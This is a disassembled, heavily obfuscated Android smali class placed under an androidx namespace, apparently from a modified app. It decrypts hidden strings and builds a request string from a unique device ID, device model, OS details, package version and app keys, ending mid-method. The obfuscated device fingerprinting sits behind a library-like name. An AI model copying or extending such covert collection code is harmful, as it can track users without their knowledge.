.class public Landroidx/base/저장;
.super Ljava/lang/Object;


# static fields
.field public static a:Z

.field public static b:Lorg/json/JSONObject;

.field public static c:Z

.field public static final d:Ljava/lang/String;

.field public static final e:Ljava/lang/String;

.field public static final f:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 5

    const/4 v4, 0x0

    const-string v0, "\u06e1\u06d7\u06ec\u06e8\u06df\u06e5\u06d8\u06e8\u06e8\u06e5\u06ec\u06e7\u06e6\u06d8\u06da\u06e8\u06e6\u06d8\u06e1\u06d8\u06d8\u06d7\u06e6\u06e2\u06db\u06d9\u06eb\u06df\u06e2\u06d6\u06d8\u06ec\u06db\u06dc\u06d8\u06d7\u06dc\u06d6\u06d8\u06e5\u06dc\u06d8\u06d8\u06d9\u06d7\u06d8\u06d8\u06e7\u06d8\u06d7\u06e8\u06e8\u06eb\u06e1\u06eb"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x32d

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x2a4

    const/16 v2, 0x2b4

    const v3, 0x2c9172f2

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "FfPD1oLucF0J78PZmtRk\n"

    const-string v1, "Zpumuu6xAC8=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Landroidx/base/저장;->d:Ljava/lang/String;

    const-string v0, "\u06e2\u06d9\u06dc\u06d8\u06dc\u06e6\u06e8\u06dc\u06e8\u06e5\u06e1\u06df\u06e8\u06e7\u06e1\u06d8\u06e1\u06d9\u06e5\u06d6\u06db\u06df\u06e4\u06da\u06dc\u06d8\u06d8\u06e0\u06e1\u06e6\u06e6\u06d7\u06eb\u06e0\u06e2\u06e2\u06e6\u06e7\u06df\u06d9\u06e2\u06e8\u06dc\u06e6"

    goto :goto_0

    :sswitch_1
    const-string v0, "BhdK05ljF+Y1BVbStHUA\n"

    const-string v1, "anY5p8YWZYo=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Landroidx/base/저장;->e:Ljava/lang/String;

    const-string v0, "\u06e0\u06eb\u06e1\u06d8\u06e2\u06da\u06e6\u06db\u06d7\u06dc\u06eb\u06d6\u06e0\u06df\u06db\u06e1\u06d9\u06e6\u06d8\u06df\u06e8\u06e6\u06ec\u06e7\u06e6\u06d7\u06e6\u06e4\u06e5\u06eb"

    goto :goto_0

    :sswitch_2
    const-string v0, "JLNyaAInLm0Xu294OCo=\n"

    const-string v1, "SNIBHF1SXAE=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Landroidx/base/저장;->f:Ljava/lang/String;

    const-string v0, "\u06e0\u06e4\u06db\u06e6\u06df\u06d6\u06e4\u06e8\u06e1\u06e6\u06e0\u06e1\u06d8\u06e6\u06d7\u06d8\u06e5\u06ec\u06ec\u06d8\u06ec\u06d8\u06df\u06e1\u06e5\u06d8\u06ec\u06e6\u06d7\u06e7\u06d6\u06e8"

    goto :goto_0

    :sswitch_3
    sput-boolean v4, Landroidx/base/저장;->a:Z

    const-string v0, "\u06d8\u06e2\u06e1\u06d8\u06df\u06e1\u06e0\u06da\u06e0\u06e5\u06e4\u06e0\u06e6\u06db\u06e6\u06e6\u06d8\u06d7\u06db\u06e4\u06e4\u06da\u06eb\u06d7\u06e4\u06d7\u06d8\u06e0\u06e1\u06e7\u06d8\u06eb\u06d7\u06e5\u06e6\u06e1\u06ec\u06da\u06d6\u06d6\u06e5\u06dc\u06d8\u06d8\u06e5\u06e6\u06df\u06e5\u06e7\u06e2"

    goto :goto_0

    :sswitch_4
    const/4 v0, 0x0

    sput-object v0, Landroidx/base/저장;->b:Lorg/json/JSONObject;

    const-string v0, "\u06d6\u06d9\u06e0\u06d8\u06e7\u06dc\u06d8\u06d7\u06e6\u06e2\u06da\u06e0\u06d8\u06df\u06e4\u06e7\u06ec\u06d8\u06e8\u06ec\u06e4\u06ec\u06d9\u06e1\u06e7\u06d8\u06e5\u06e1\u06d9\u06e2\u06e1\u06d6\u06e6\u06e6\u06ec\u06d9\u06dc\u06dc\u06ec\u06e4\u06e1\u06d8\u06d9"

    goto :goto_0

    :sswitch_5
    sput-boolean v4, Landroidx/base/저장;->c:Z

    const-string v0, "\u06e8\u06d6\u06ec\u06da\u06e2\u06d9\u06dc\u06e0\u06dc\u06d8\u06e2\u06ec\u06da\u06d6\u06e6\u06d6\u06db\u06d7\u06eb\u06d8\u06d7\u06df\u06e5\u06db\u06db\u06d7\u06e8\u06ec\u06e4\u06e1\u06d9\u06dc\u06d6\u06dc\u06d8\u06e7\u06d6\u06dc\u06d6\u06e7\u06db\u06db\u06e2\u06d9\u06d7\u06d8\u06d8\u06e0\u06e7\u06dc"

    goto :goto_0

    :sswitch_6
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x44bf3615 -> :sswitch_0
        -0x43dea2c0 -> :sswitch_3
        -0x3ac3ce92 -> :sswitch_4
        -0x17cbc217 -> :sswitch_2
        0x1dab17b8 -> :sswitch_5
        0x2ef569f0 -> :sswitch_1
        0x7b419abe -> :sswitch_6
    .end sparse-switch
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic a([I[Ljava/lang/String;[ILandroid/content/Context;[ILandroid/content/SharedPreferences;[Ljava/lang/String;[Z[ZZ[I)V
    .locals 18

    const-string v2, ""

    move-object v3, v2

    :goto_0
    const v4, -0x59cdc344

    const-string v2, "\u06e0\u06df\u06d6\u06e1\u06e0\u06e4\u06dc\u06ec\u06d9\u06e0\u06e5\u06d8\u06d8\u06d9\u06dc\u06e8\u06d8\u06d9\u06d6\u06ec\u06da\u06da\u06dc\u06e6\u06d8\u06d8\u06df\u06d7\u06e8\u06d6\u06e1\u06d8\u06df\u06e0\u06d8\u06df\u06e1\u06d6"

    :goto_1
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_0

    goto :goto_1

    :sswitch_0
    const v5, 0x333be663

    const-string v2, "\u06da\u06e5\u06d6\u06e8\u06eb\u06e6\u06d8\u06d7\u06dc\u06e6\u06d8\u06d9\u06e0\u06e4\u06e1\u06df\u06dc\u06dc\u06da\u06da\u06d9\u06d8\u06eb\u06eb\u06da\u06da\u06e0\u06e1\u06d6\u06e6\u06e8"

    :goto_2
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_1

    goto :goto_2

    :sswitch_1
    const/4 v2, 0x0

    aget v2, p0, v2

    if-nez v2, :cond_0

    const-string v2, "\u06da\u06e6\u06dc\u06df\u06eb\u06e5\u06e0\u06e4\u06d6\u06d8\u06e7\u06db\u06e8\u06d8\u06d7\u06e5\u06e6\u06e4\u06d9\u06dc\u06d8\u06d6\u06d7\u06e5\u06d8\u06e0\u06e7\u06d6\u06d8\u06e1\u06e6\u06d6\u06d8\u06dc\u06e8\u06d8\u06e8\u06e7\u06e4\u06d7\u06e7\u06dc\u06d8\u06e6\u06e6\u06e6\u06e1\u06d7\u06e7"

    goto :goto_2

    :sswitch_2
    const-string v2, "\u06e6\u06e7\u06d6\u06e5\u06e2\u06d6\u06d8\u06e1\u06e7\u06d8\u06e0\u06eb\u06d9\u06d7\u06df\u06d6\u06d8\u06eb\u06e1\u06e7\u06d8\u06e6\u06e4\u06da\u06da\u06e4\u06e0\u06ec\u06e6\u06d9\u06e7\u06d8\u06d8\u06d8"

    goto :goto_1

    :cond_0
    const-string v2, "\u06d8\u06e8\u06e5\u06ec\u06e4\u06e0\u06e7\u06e8\u06d7\u06e0\u06d9\u06e7\u06e4\u06eb\u06e8\u06d8\u06d7\u06e1\u06e6\u06db\u06e6\u06da\u06e6\u06e2\u06d9\u06df\u06df\u06e1\u06e5\u06e1\u06e2\u06d9\u06e0\u06e0\u06d9\u06d6\u06e6"

    goto :goto_2

    :sswitch_3
    const-string v2, "\u06d8\u06d8\u06e7\u06d8\u06e5\u06dc\u06e0\u06e7\u06e2\u06d6\u06d8\u06d8\u06d9\u06dc\u06e1\u06db\u06e1\u06dc\u06e2\u06db\u06ec\u06dc\u06e6\u06d8\u06e4\u06da\u06e4\u06db\u06e5\u06e7\u06d6\u06e1\u06e7\u06e0\u06e6\u06d8\u06e6\u06e1\u06e8\u06d8\u06d6\u06d6\u06d7\u06d7\u06d8\u06ec\u06e2\u06e1\u06d9\u06db\u06e6\u06e8\u06d8\u06eb\u06d9\u06e8\u06d8\u06e5\u06e1\u06da"

    goto :goto_2

    :sswitch_4
    const-string v2, "\u06ec\u06e8\u06db\u06e5\u06e5\u06d7\u06e2\u06d9\u06e8\u06d8\u06ec\u06df\u06ec\u06e1\u06e4\u06e4\u06df\u06ec\u06d9\u06d9\u06d6\u06d8\u06e2\u06d9\u06e6\u06da\u06e6\u06d8\u06e7\u06da\u06e4\u06d9\u06df\u06e8\u06d8\u06da\u06e8\u06e5"

    goto :goto_1

    :sswitch_5
    const-string v2, "\u06dc\u06e2\u06e2\u06e5\u06da\u06d8\u06d8\u06df\u06e6\u06db\u06ec\u06eb\u06ec\u06ec\u06e6\u06e8\u06e4\u06df\u06e0\u06d7\u06e2\u06d9\u06dc\u06e7\u06d8\u06d8\u06eb\u06e1\u06dc\u06d8\u06d9\u06d7\u06dc\u06d8\u06e7\u06ec\u06d7\u06dc\u06df\u06dc\u06d6\u06da\u06e1\u06d8\u06e8\u06e0\u06e0"

    goto :goto_1

    :sswitch_6
    const/4 v2, 0x0

    aget v2, p2, v2

    aget-object v2, p1, v2

    :goto_3
    const v5, 0xe3792d2

    const-string v4, "\u06d9\u06dc\u06e7\u06e5\u06e0\u06e6\u06df\u06d8\u06e8\u06d8\u06e8\u06da\u06e2\u06d6\u06e1\u06db\u06e4\u06da\u06dc\u06ec\u06e0\u06eb\u06eb\u06d8\u06e6\u06d8\u06d7\u06eb\u06d9\u06d8\u06d7\u06d8\u06d8\u06e4\u06eb\u06e6\u06d8\u06ec\u06dc\u06d6"

    :goto_4
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_2

    goto :goto_4

    :sswitch_7
    move-object v6, v2

    :goto_5
    :try_start_0
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->getHost()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/net/InetAddress;->getAllByName(Ljava/lang/String;)[Ljava/net/InetAddress;

    move-result-object v4

    const v5, -0x4108a50b

    const-string v2, "\u06eb\u06d8\u06e2\u06e4\u06eb\u06ec\u06e6\u06e4\u06d8\u06e7\u06e1\u06d6\u06dc\u06ec\u06e6\u06e2\u06e6\u06e2\u06e8\u06dc\u06e7\u06df\u06d7\u06e0\u06e7\u06e4\u06dc\u06e8\u06d6\u06d8\u06e8\u06d9\u06ec\u06d7\u06e8\u06ec\u06e5\u06d8\u06e4\u06e4\u06d6\u06eb\u06e7\u06d9\u06e2\u06e7\u06e0\u06e1\u06e1\u06d6\u06d7\u06e7\u06e4"

    :goto_6
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result v7

    xor-int/2addr v7, v5

    sparse-switch v7, :sswitch_data_3

    goto :goto_6

    :sswitch_8
    move-object v2, v3

    :goto_7
    :try_start_1
    invoke-virtual/range {p3 .. p3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual/range {p3 .. p3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v7

    const/4 v5, 0x0

    invoke-virtual {v7, v4, v5}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v5

    iget-object v8, v5, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    iget v5, v5, Landroid/content/pm/PackageInfo;->versionCode:I

    invoke-static/range {p3 .. p3}, LKvrUY/RiiGL/Utils;->getUniqueDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    sget-object v10, Landroid/os/Build;->BRAND:Ljava/lang/String;

    sget-object v11, Landroid/os/Build;->MODEL:Ljava/lang/String;

    sget-object v12, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    sget v13, Landroid/os/Build$VERSION;->SDK_INT:I

    const-string v14, "mA==\n"

    const-string v15, "tJtAMc37eqE=\n"

    invoke-static {v14, v15}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    sget-object v15, Landroid/os/Build;->SUPPORTED_ABIS:[Ljava/lang/String;

    invoke-static {v14, v15}, Landroid/text/TextUtils;->join(Ljava/lang/CharSequence;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_a

    :try_start_2
    const-string v16, "ppg+eVXHsHc=\n"

    const-string v17, "1vldEjSg1Uo=\n"

    invoke-static/range {v16 .. v17}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "yokqscLWO+SzkS6u1II=\n"

    const-string v16, "7P9Pw7G/VIo=\n"

    move-object/from16 v0, v16

    invoke-static {v4, v0}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "LK5gLEda87dVu2o6UQ4=\n"

    const-string v8, "CtgFXjQznNk=\n"

    invoke-static {v4, v8}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "1yHpDRgHRw==\n"

    const-string v5, "8UCZfXFjeto=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/netease/mc/m439a/cfEHNcirhPZZLCL;->APP_ID:Ljava/lang/String;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "qAkvd8D0HJA=\n"

    const-string v5, "jmhfB6uRZa0=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/netease/mc/m439a/cfEHNcirhPZZLCL;->APP_KEY:Ljava/lang/String;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "+QiqK4Y=\n"

    const-string v5, "32PPUrvue7I=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/netease/mc/m439a/cfEHNcirhPZZLCL;->KEY:Ljava/lang/String;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "+aNJpKk=\n"

    const-string v5, "38cgwJQRfTw=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "/hwEnV6SbHK8AQ6xQ4c8\n"

    const-string v5, "2G997ir3AS0=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "4YerI+lbWhGihrAv6lk4\n"

    const-string v4, "x/TDRoU3BWc=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "KRu5\n"

    const-string v4, "GC6Jx8qfvCo=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "HS97HG8hyg==\n"

    const-string v4, "O00JfQFF930=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "iBfUsvlAzA==\n"

    const-string v4, "rnq71pws8Vk=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "BYAh6v2VldF8lyr8/JOT2x4=\n"

    const-string v4, "I+FPjo/6/LU=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "mOr2rPrD3HqD\n"

    const-string v4, "vpmSx6Wqsg4=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "h0co3eQ=\n"

    const-string v4, "oSZKtNmOLns=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/netease/mc/m439a/cfEHNcirhPZZLCL;->DNS_POOL:Ljava/lang/String;

    const-string v4, "KZizpRYpng==\n"

    const-string v5, "crv360UKw2k=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Lj$/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    const/4 v4, -0x1

    const v10, 0x24bb4069

    const-string v2, "\u06ec\u06d8\u06e5\u06d8\u06d7\u06df\u06d6\u06d8\u06e6\u06e1\u06e6\u06dc\u06da\u06df\u06e5\u06df\u06e4\u06df\u06e2\u06df\u06e4\u06e0\u06db\u06e4\u06e6\u06e6\u06da\u06da\u06e6\u06d8\u06da\u06e6\u06ec"

    :goto_8
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_5

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_4

    goto :goto_8

    :sswitch_9
    move v2, v4

    :goto_9
    :sswitch_a
    const/4 v4, 0x0

    move v5, v2

    :goto_a
    const v10, -0x7449ab1e

    const-string v2, "\u06df\u06e7\u06d8\u06d8\u06d7\u06db\u06d8\u06d8\u06df\u06eb\u06ec\u06d8\u06e2\u06e6\u06dc\u06e5\u06df\u06d6\u06e1\u06eb\u06d9\u06d8\u06df\u06df\u06d8\u06dc\u06d8\u06d8\u06e7\u06dc\u06da\u06e7\u06d6\u06d8\u06e2\u06e2\u06db\u06e2\u06db\u06d6\u06e1\u06e6\u06d8\u06e8\u06e6\u06e8\u06d8\u06e1\u06dc\u06e7\u06d8\u06db\u06df\u06db"

    :goto_b
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_5

    goto :goto_b

    :goto_c
    :sswitch_b
    const v4, -0x8ab60aa

    const-string v2, "\u06eb\u06e2\u06d6\u06df\u06d7\u06e8\u06e1\u06ec\u06dc\u06d8\u06e8\u06e7\u06e5\u06e4\u06e7\u06e0\u06e0\u06e0\u06d6\u06e7\u06d7\u06e6\u06e4\u06e1\u06d8\u06d8\u06db\u06dc\u06d8\u06ec\u06df\u06d8\u06e1\u06ec\u06e5\u06e0\u06dc\u06db\u06e0\u06e8\u06e8\u06e0\u06e4\u06e1\u06da\u06e0\u06e2\u06df\u06e5\u06e4\u06e4\u06e6\u06d8\u06e0\u06d6\u06da"

    :goto_d
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v4

    sparse-switch v6, :sswitch_data_6

    goto :goto_d

    :sswitch_c
    const-string v2, "\u06e5\u06eb\u06e4\u06d8\u06e5\u06d8\u06e1\u06d9\u06e2\u06d7\u06ec\u06e1\u06ec\u06e5\u06d8\u06d9\u06e4\u06df\u06d7\u06e7\u06e5\u06d7\u06d6\u06e8\u06d8\u06dc\u06e5\u06da\u06e1\u06db\u06e2\u06da\u06da\u06e1\u06d8\u06ec\u06db\u06d7"

    goto :goto_d

    :sswitch_d
    sget-object v2, Landroidx/base/하늘;->a:[Ljava/lang/String;

    const/4 v4, 0x0

    aget v4, p2, v4

    aget-object v2, v2, v4

    goto/16 :goto_3

    :sswitch_e
    const-string v4, "\u06e6\u06e4\u06e4\u06df\u06db\u06d9\u06dc\u06e7\u06da\u06d6\u06da\u06dc\u06eb\u06e0\u06da\u06e6\u06e4\u06d7\u06e4\u06d6\u06da\u06e6\u06df\u06e7\u06dc\u06ec\u06db\u06df\u06d7\u06d9\u06e8\u06d8\u06e1\u06e6\u06d8\u06e7\u06e8\u06df\u06ec\u06e6\u06dc"

    goto/16 :goto_4

    :sswitch_f
    const v6, 0x2579bf69

    const-string v4, "\u06e0\u06d9\u06e1\u06e1\u06e1\u06e4\u06d9\u06ec\u06e8\u06d9\u06eb\u06d8\u06d9\u06e7\u06dc\u06eb\u06eb\u06e1\u06d6\u06e0\u06e4\u06ec\u06e7\u06e5\u06dc\u06dc\u06d8\u06d9\u06e5\u06e1\u06d8\u06eb\u06db\u06da\u06e4\u06db\u06e5"

    :goto_e
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_7

    goto :goto_e

    :sswitch_10
    const-string v4, "og==\n"

    const-string v7, "iOcodRKo8oc=\n"

    invoke-static {v4, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_1

    const-string v4, "\u06ec\u06ec\u06d9\u06e0\u06eb\u06e5\u06d8\u06e5\u06e4\u06e2\u06da\u06e2\u06ec\u06dc\u06df\u06d6\u06d8\u06e0\u06d6\u06e5\u06da\u06ec\u06e4\u06eb\u06e8\u06e1\u06eb\u06e5\u06d6\u06d9\u06e5\u06dc\u06d6\u06d6\u06e1\u06d9\u06e1\u06df\u06ec\u06dc\u06ec\u06e8\u06e8\u06d8"

    goto :goto_e

    :cond_1
    const-string v4, "\u06e8\u06df\u06eb\u06d8\u06e0\u06ec\u06e5\u06d6\u06e7\u06eb\u06e4\u06ec\u06df\u06d7\u06e8\u06df\u06e4\u06eb\u06d7\u06d7\u06e8\u06d9\u06eb\u06d9\u06e8\u06e1\u06e1\u06e0\u06ec\u06e4\u06e7\u06df\u06da\u06ec\u06dc\u06e2\u06d9\u06e6\u06e2\u06e0\u06d8\u06d8"

    goto :goto_e

    :sswitch_11
    const-string v4, "\u06e5\u06d9\u06d6\u06e5\u06dc\u06d6\u06e7\u06e4\u06db\u06eb\u06d8\u06eb\u06e4\u06ec\u06e8\u06e0\u06e0\u06e5\u06d8\u06d9\u06d8\u06e7\u06d8\u06d8\u06e5\u06e0\u06eb\u06e8\u06e8\u06d9\u06da\u06e4\u06e0\u06e5\u06d8\u06e2\u06da\u06e2\u06e1\u06dc\u06dc\u06d8\u06e8\u06da\u06dc\u06dc\u06e6\u06e2\u06db\u06ec\u06d8"

    goto :goto_e

    :sswitch_12
    const-string v4, "\u06dc\u06e4\u06e6\u06d8\u06e7\u06da\u06eb\u06e2\u06dc\u06e8\u06e6\u06d7\u06e2\u06e5\u06df\u06d6\u06d8\u06d9\u06d6\u06e1\u06d8\u06e1\u06e6\u06d7\u06d8\u06e5\u06d8\u06e7\u06e7\u06d6\u06d8\u06e6\u06e5\u06d7"

    goto/16 :goto_4

    :sswitch_13
    const-string v4, "\u06ec\u06d7\u06e4\u06e1\u06e5\u06eb\u06e8\u06d6\u06e0\u06e5\u06e4\u06d8\u06da\u06e8\u06d8\u06e0\u06d7\u06e6\u06d8\u06e4\u06d7\u06e1\u06d7\u06e5\u06e8\u06d8\u06d6\u06e7\u06d6\u06dc\u06db\u06e5\u06d8\u06da\u06e1\u06d6\u06d8\u06ec\u06e2\u06e6\u06d8\u06db\u06ec\u06da\u06d6\u06e2\u06eb"

    goto/16 :goto_4

    :sswitch_14
    const-string v4, "Xw==\n"

    const-string v5, "ddeDh5YsdnE=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {}, LKvrUY/RiiGL/Utils;->generateRandomString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    move-object v6, v2

    goto/16 :goto_5

    :sswitch_15
    :try_start_3
    const-string v2, "\u06d6\u06ec\u06e7\u06ec\u06e4\u06da\u06e2\u06df\u06dc\u06e0\u06e5\u06e7\u06dc\u06d8\u06d8\u06da\u06eb\u06d8\u06d9\u06d8\u06e6\u06d8\u06e4\u06e4\u06e0\u06d9\u06d9\u06d8\u06e5\u06e5\u06d8\u06d8\u06e5\u06e0\u06db\u06e5\u06e7\u06e1\u06d8\u06d8\u06db\u06d7\u06e8\u06e7\u06d8\u06e2\u06d7\u06e2\u06e0\u06e6\u06d8"

    goto/16 :goto_6

    :sswitch_16
    const v7, -0xfd973b2

